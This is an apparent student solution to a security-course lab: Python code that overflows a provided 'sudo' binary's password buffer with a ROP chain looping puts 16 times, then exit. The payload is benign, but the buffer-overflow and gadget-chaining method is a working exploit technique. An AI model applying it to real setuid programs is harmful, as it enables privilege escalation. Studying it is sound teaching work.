import os
import sys
import base64

import addresses
from infosec.utils import assemble
from search import GadgetSearch

import struct 

PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP-chain for printing our
    message in a finite loop of 16 iterations. Make sure to return a `bytes` object
    and not an `str` object.

    NOTES:
    1. Make sure your loop is executed exactly 16 times.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.
    3. Make sure to call exit() at the end of your loop (any error code will do).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)

    # The offset from the addresses.RA_ADDRESS to the first gadget in the loop 
    offset_from_ra_to_loop_start = 4 * 5

    # The offset from the addresses.RA_ADDRESS to the first char of the string 'Take me (321962714) to your leader!' 
    offset_from_ra_to_string = 4 * 42 # 42 is the number of 4 bytes cells in the stack that separates the string and addresses.RA_ADDRESS

    # The offset from the addresses.RA_ADDRESS to the place in the stack where we decide to exit the loop or do another iteration 
    offset_from_ra_to_condition_test = 4 * 39 # this is the offset where the last "POP esp" gadget is located 

    # fill the buffer so we will reach the return address in the stack
    padding_size = addresses.RA_ADDRESS - addresses.BUFF_START 

    password  = padding_size * b'\x90'

    # replace the return address, so we will jump to the first gadget
    # eax <-- 16, the number of  iterations 
    password +=  struct.pack("<I", search.find_format("POP eax")[1])
    password +=  struct.pack("<I", 16)
    
    # edi <-- eax=16
    password +=  struct.pack("<I", search.find_format("XCHG eax, edi")[1]) 

    # store the address of the puts function in ebp
    password +=  struct.pack("<I", search.find_format("POP ebp")[1])
    password +=  struct.pack("<I", addresses.PUTS)

    # jmp to puts, first gadget in the loop 
    password +=  struct.pack("<I", addresses.PUTS)

    # the return address from puts, just add 4 to esp to jump over the argument to puts 
    password +=  struct.pack("<I", search.find_format("ADD esp, 4")[1])

    # the pointer to the string 'Take me (321962714) to your leader!' 
    password +=  struct.pack("<I", addresses.RA_ADDRESS + offset_from_ra_to_string)

    # dec the loop index - edi <-- edi - 1
    password +=  struct.pack("<I", search.find_format("XCHG eax, edi")[1]) 
    password +=  struct.pack("<I", search.find_format("DEC eax")[1]) 
    password +=  struct.pack("<I", search.find_format("XCHG eax, edi")[1]) 

    # make all the flags be 0 
    password +=  struct.pack("<I", search.find_format("POP eax")[1])
    password +=  struct.pack("<I", 0)
    password +=  struct.pack("<I", search.find_format("SAHF")[1])

    # duplicate the loop index (edi), so now both edi and eax will hold the loop index
    password +=  struct.pack("<I", search.find_format("XCHG eax, edi")[1])
    password +=  struct.pack("<I", search.find_format("XCHG eax, edx")[1])
    password +=  struct.pack("<I", search.find_format("MOV eax, edx")[1])
    password +=  struct.pack("<I", search.find_format("XCHG eax, edi")[1])
    password +=  struct.pack("<I", search.find_format("XCHG eax, edx")[1])

    # CF = 1 (if eax is non zero), else 0  
    password +=  struct.pack("<I", search.find_format("NEG eax")[1])

    # load all the flags to ah
    password +=  struct.pack("<I", search.find_format("LAHF")[1]) 
    
    # eax[8] holds the CF, shift right eax 8 times, so CF will be the LSB of eax 
    password +=  struct.pack("<I", search.find_format("SHR eax, 1")[1]) * 8 

    # in case the other bits of eax are non-zero, eax = eax & 0x1
    password +=  struct.pack("<I", search.find_format("AND eax, 1")[1])

    # now eax is 1 (if edi>0) or 0 (if edi == 0)
    # dec eax so - eax = 0 (if edi>0) or 0xffffffff (if edi == 0)
    password +=  struct.pack("<I", search.find_format("DEC eax")[1]) 

    # edx <-- 8 
    password +=  struct.pack("<I", search.find_format("POP edx")[1])
    password +=  struct.pack("<I", 8)

    # edx <-- edx & eax = 8 if eax==0xffffffff, or 0 if eax==0
    password +=  struct.pack("<I", search.find_format("AND eax, edx")[1])
    password +=  struct.pack("<I", search.find_format("XCHG eax, edx")[1]) 

    # eax <-- the address in the stack of the gadget that returns to the beginning of the loop - "POP esp" 
    password +=  struct.pack("<I", search.find_format("POP eax")[1])
    password +=  struct.pack("<I", addresses.RA_ADDRESS + offset_from_ra_to_condition_test)

    # esp <-- esp + (eax & edx) = esp + (8 if(edi==0), else 0) 
    # so if edi==0 we will exit the loop and ju,p to exit, otherwise we will return to the beginning of the loop 
    password +=  struct.pack("<I", search.find_format("ADD eax, edx")[1])
    password +=  struct.pack("<I", search.find_format("XCHG eax, esp")[1]) 

    # change esp to the location of the first gadget in the loop, so when we 
    # will return from the gadget we will jump to puts again 
    password +=  struct.pack("<I", search.find_format("POP esp")[1])
    password +=  struct.pack("<I", addresses.RA_ADDRESS + offset_from_ra_to_loop_start)

    # if edi==0, jump to exit 
    password +=  struct.pack("<I", addresses.EXIT)

    # append the string we want tp print to the password, it will be inserted to 
    # the end of part of the stack that the password changes 
    password +=  (get_string("321962714")).encode("latin-1")

    return password  



def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
